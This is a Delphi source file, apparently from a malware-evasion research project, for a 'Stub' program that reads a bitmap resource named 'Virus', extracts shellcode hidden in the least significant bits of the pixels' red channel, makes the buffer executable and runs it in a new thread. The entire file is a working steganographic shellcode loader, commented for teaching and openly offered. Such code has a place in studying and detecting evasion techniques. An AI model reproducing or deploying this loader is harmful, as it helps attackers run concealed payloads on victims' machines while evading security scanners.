{******************************************************************************}
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://www.unprotect.it/                                  }
{                   https://github.com/Unprotect-Project                       }
{                   https://github.com/darkcodersc                             }
{                   https://github.com/PhrozenIO                               }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{******************************************************************************}

program Stub;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.Classes,
  System.SysUtils,
  Winapi.Windows,
  uExceptions in '..\Shared\uExceptions.pas',
  uFunctions in '..\Shared\uFunctions.pas';

(* EntryPoint *)

const RES_NAME = 'Virus';

begin
  try
    // We are here to demonstrate how to use the Windows API to manipulate
    // application resources. However, depending on the programming language you
    // use, you might prefer more convenient methods, such as directly using
    // TBitmap.LoadFromResource or MemoryStream to achieve the same effect.
    // I wanted to create an example that relies as little as possible on
    // Delphi-specific features, making it easier for you to port the concepts
    // to your preferred programming language.

    //
    // Retrieve our Bitmap and Point to it
    //

    // https://learn.microsoft.com/fr-fr/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew?WT_mc_id=SEC-MVP-5005282
    var hResourceBlock : THandle := FindResourceW(0, RES_NAME, RT_BITMAP);
    if hResourceBlock = 0 then
      raise EWindowsException.Create('FindResourceW');

    // https://learn.microsoft.com/fr-fr/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource?WT_mc_id=SEC-MVP-5005282
    var hResource : THandle := LoadResource(0, hResourceBlock);
    if hResource = 0 then
      raise EWindowsException.Create('LoadResource');

    // https://learn.microsoft.com/fr-fr/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource?WT_mc_id=SEC-MVP-5005282
    var pData := LockResource(hResource);
    if not Assigned(pData) then
      raise EWindowsException.Create('LockResource');

    // https://learn.microsoft.com/fr-fr/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource?WT_mc_id=SEC-MVP-5005282
    var pDataSize := SizeOfResource(0, hResourceBlock);
    if pDataSize = 0 then
      raise EWindowsException.Create('SizeOfResource');

    WriteLn(Format('Bitmap resource offset:`0x%p`, size: %s', [
      pData,
      FormatSize(pDataSize)
    ]));

    var pBitmapHeader : PBitmapInfoHeader := pData;

    if (pBitmapHeader^.biBitCount <> 24) and (pBitmapHeader^.biBitCount <> 32) then
      raise Exception.Create('Unsupported bitmap format. Must be 24-bit or 32-bit.');

    //
    // Decode Shellcode Size (UInt64) and Shellcode (Raw)
    //

    var APayloadSize : UInt64 := 0;
    var APayloadSizeBuffer : array[0..(SizeOf(UInt64) * 8) -1] of byte;
    var AEncodedPayloadBuffer : array of byte;

    // Initialize our buffer with zero's
    ZeroMemory(@APayloadSizeBuffer[0], Length(APayloadSizeBuffer));

    var ABreak := False;
    var ACursor : UInt64 := 0;
    var pRow : PByte := Pointer(NativeUInt(pData) + SizeOf(TBitmapInfoHeader));

    for var Y := 0 to pBitmapHeader^.biHeight -1 do begin
      for var X := 0 to pBitmapHeader^.biWidth -1 do begin
        // A brief explanation: Typically, we use the RGBTriple structure for 24-bit
        // bitmap images and RGBQuad for 32-bit bitmap images. However, if we don't
        // need to consider the alpha value in a 32-bit bitmap, we can streamline our
        // code by using RGBTriple for both 32-bit and 24-bit bitmaps. We just need
        // to ensure that we correctly increment our pixel row based on the bitmap's
        // bit-depth. This optimization simplifies our code, but it's essential to
        // note that if we were using alpha for transparency, we would need to use
        // the appropriate pixel structure based on the bitmap's pixel format.
        var pPixel := PRGBTriple(NativeUInt(pRow) + X * SizeOf(TRGBTriple));

        // Read Payload Size = SizeOf(UInt64) * 8
        if (ACursor <= SizeOf(UInt64) * 8) and (Length(AEncodedPayloadBuffer) = 0) then begin
          // If red color value is odd, then it is a binary '1' otherwise '0'
          if odd(pPixel^.rgbtRed) then
            APayloadSizeBuffer[ACursor] := 1;

          // Decode payload size, turn back '0' and '1' back to its original value.
          // Here a UInt64 (64bit) containing our payload size in bytes.
          if ACursor = SizeOf(UInt64) * 8 then begin
            for var I := (SizeOf(UInt64) * 8) -1 downto 0 do begin
              APayloadSize := APayloadSize shl 1;
              if APayloadSizeBuffer[I] = 1 then
                APayloadSize := APayloadSize or 1;
            end;

            WriteLn(Format('Shellcode Size: %d bytes.', [APayloadSize]));

            if APayloadSize <= 0 then
              raise Exception.Create('Invalid Shellcode Size.');

            // Initialize our encoded payload buffer with retrieved payload size in bits.
            SetLength(AEncodedPayloadBuffer, APayloadSize * 8);

            // Initialize our encoded payload buffer with zero's
            ZeroMemory(@AEncodedPayloadBuffer[0], Length(AEncodedPayloadBuffer));

            WriteLn(Format('Extracting our encoded Shellcode from %d pixels...', [
              APayloadSize * 8
            ]));

            // Reinitialize our cursor
            ACursor := 0;
          end;
        end;

        //

        // Read Encoded Payload = SizeOf(Byte) * 8 * APayloadSize
        if (Length(AEncodedPayloadBuffer) > 0) and
           (ACursor < Length(AEncodedPayloadBuffer)) then begin
              if odd(pPixel^.rgbtRed) then
                AEncodedPayloadBuffer[ACursor] := 1;
        end;

        // Are we done?
        if (Length(AEncodedPayloadBuffer) > 0) and
           (ACursor >= Length(AEncodedPayloadBuffer)) then begin
              ABreak := True;

              break;
        end;

        ///
        Inc(ACursor);
      end;

      if ABreak then
        break;

      ///
      Inc(pRow, pBitmapHeader^.biWidth * (pBitmapHeader^.biBitCount div 8));
    end;

    // Decode our payload
    WriteLn('Shellcode Successfully Extracted, Decoding...');

    var ADecodedPayloadBuffer : array of byte;

    SetLength(ADecodedPayloadBuffer, APayloadSize);

    var AChunkCount : UInt64 := 0;
    ACursor := 0;
    repeat
      var AByte : Byte := 0;
      ///

      for var I := (SizeOf(Byte) * 8) -1 downto 0 do begin
        // Decode chunk
        AByte := AByte shl 1;
        if AEncodedPayloadBuffer[ACursor + I] = 1 then
          AByte := AByte or 1;
      end;

      ADecodedPayloadBuffer[AChunkCount] := AByte;

      Inc(AChunkCount);

      ///
      Inc(ACursor, SizeOf(Byte) * 8);
    until AChunkCount = APayloadSize;

    WriteLn('@Shellcode Dump:');
    WriteLn(BufferToHexView(@ADecodedPayloadBuffer[0], Length(ADecodedPayloadBuffer)));
    WriteLn('---');

    //
    // Execute Shellcode
    //

    WriteLn('Execute Shellcode in a new Thread...');

    var AOldProtect : DWORD;
    if not VirtualProtect(@ADecodedPayloadBuffer[0], Length(ADecodedPayloadBuffer), PAGE_EXECUTE_READWRITE, @AOldProtect) then
      raise EWindowsException.Create('VirtualProtect');

    var AThreadId : Cardinal;
    var AThreadHandle := CreateThread(0, 0, @ADecodedPayloadBuffer[0], nil, 0, AThreadId);
    if AThreadHandle = 0 then
      raise EWindowsException.Create('CreateThread');

    WriteLn(Format('Thread spawned: thread_id=[%d], offset=[0x%p].', [
      AThreadId,
      @ADecodedPayloadBuffer[0]
    ]));

    // Wait til shellcode execution ends.
    WaitForSingleObject(AThreadHandle, INFINITE);

    ///
    WriteLn('Enjoy ;-)');
  except
    on E: Exception do
      Writeln('Error: ', E.ClassName, ': ', E.Message);
  end;
end.
